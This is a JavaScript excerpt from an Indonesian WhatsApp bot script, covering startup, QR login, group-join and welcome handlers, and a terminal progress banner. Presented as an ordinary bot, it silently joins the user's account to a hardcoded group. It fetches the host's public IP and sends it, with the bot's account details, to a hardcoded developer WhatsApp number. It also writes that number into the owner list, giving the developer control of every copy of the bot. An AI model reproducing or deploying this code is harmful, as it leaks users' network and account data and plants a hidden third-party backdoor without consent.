...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    ...
    pemuda.browserDescription = ['Abw meme','Desktop','3.0']
    await sleep(10000)
    pemuda.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan Kodenya bang', 'red'))
    })
    fs.existsSync('./abw.json') && pemuda.loadAuthInfo('./abw.json')
  ...
  fs.writeFileSync("./abw.json",JSON.stringify(pemuda.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/HX5Z2dSdbQB31FIZaQwtTE`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
 teks = `https://chat.whatsapp.com/HX5Z2dSdbQB31FIZaQwtTE`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
 pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Abw', 'cyan'))
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Abw meme",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6285230628605?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('mengirim info bot anda ke dev', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6285230628605@s.whatsapp.net", `─────「 *IP-ANDA* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Abw meme",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6285230628605?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('mengirim ip address anda ke dev', 'red'))
   })
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["6285230628605@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6285230628605@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
        ...
        pemuda.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6285230628605:6285230628605\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('recode by abw and dev denis putra', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('halo owner' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nbentar ya mau jadi bot? hubungi abw ' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;
